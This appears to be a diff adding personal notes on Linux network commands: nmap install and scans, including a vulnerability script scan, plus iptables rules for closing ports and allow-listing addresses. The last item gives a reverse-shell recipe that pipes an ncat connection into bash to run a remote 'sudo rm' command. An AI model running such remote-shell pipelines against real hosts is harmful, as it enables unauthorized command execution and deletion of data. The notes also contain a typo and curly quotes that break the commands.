@@ -1,0 +1,41 @@
+1. Installing nmap:
+sudo apt-get update
+sudo apt-get install nmap
+
+2. Basic network scan:
+nmap followed by the IP address or hostname of the target system.
+For example, nmap 192.168.1.1 will scan the host with IP address 192.168.1.1.
+
+3. Scan for open ports:
+The -p option is used to specify the port number(s) to scan.
+For example, nmap -p 80,443 192.168.1.1 will scan for open ports 80 and 443 on host 192.168.1.1.
+
+4. Scan for all open ports on remote machine:
+Use the -p- option.
+For example, nmap -p- 192.168.1.1 will scan all ports on the host with IP address 192.168.1.1.
+
+5. Scan for open ports on local machine:
+nmap localhost
+
+6. Scan for vulnerabilities:
+The --script option can be used to scan for vulnerabilities on a target host.
+For example, nmap --script vuln 192.168.1.1 will scan for known vulnerabilities on host 192.168.1.1.
+
+7. Closing a port on local machine:
+ iptables -A INPUT -p tcp --dport PORT_NUMBER -j DROP
+Replace “PORT_NUMBER” with the number of the port that you want to close. This command will add a rule to the INPUT chain of your firewall’s iptables configuration, which will drop any incoming packets to the specified port. (Will be useful to close any backdoors. Be careful to not close standard ports like 22. 22 is used for SSH connections and this means that you will not be able to connect to the remote machine using SSH).
+If a port is showing as “filtered” instead of “open” after running the command, it means that the traffic to that port is being dropped by the firewall rule you just created.
+
+8.Commands to block requests from non-legitimate IPs:
+Command used to add a new rule to the Linux iptables firewall that will block incoming TCP traffic from any source IP address except for 203.0.113.2, on port 15555.
+    sudo iptables -I INPUT -p tcp ! -s 203.0.113.2 --dport 15555 -j DROP
+For a range we need to use the below command:
+    sudo iptables -I INPUT -p tcp ! --src-range 203.0.113.2-203.0.113.35 --dport 15555 -j DROP
+Save changes in IP table:
+    sudo iptables-save
+
+9. One Way to get reverse shell access (Needs testing on the live node - Tested on local for now)
+sudo ncat -k -l 9991 & (Run on the server to listen to port. For ex: 9991)
+Command to get a reverse shell and execute a command on server from client:
+/bin/bash -c “nc -v server 9991 | /bin/bash -c ‘sudo rm x.txt > /users/usc430bg/output.txt’”
+We can have any command that replaces ‘sudo tm x.txt’
